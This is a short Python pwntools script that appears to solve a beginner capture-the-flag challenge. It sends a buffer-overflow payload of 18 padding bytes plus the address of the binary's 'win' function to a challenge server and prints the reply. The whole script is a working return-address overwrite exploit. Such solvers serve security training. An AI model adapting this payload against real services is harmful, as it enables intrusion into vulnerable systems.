#!/usr/bin/env python3
from pwn import context,ELF,remote,p64
import os

HOST = os.getenv("CTF4B_HOST", "localhost")
PORT = int(os.getenv("CTF4B_PORT", "9001"))

context.log_level = "critical"
binfile = "./chall"
e = ELF(binfile)
context.binary = binfile

p = remote(HOST, PORT)

payload = b"a" * 18 + p64(e.sym["win"])
assert len(payload) <= 0x20

p.sendlineafter(b"input:", payload)
p.readline()
p.readline()
print(p.readline().decode(), end="")
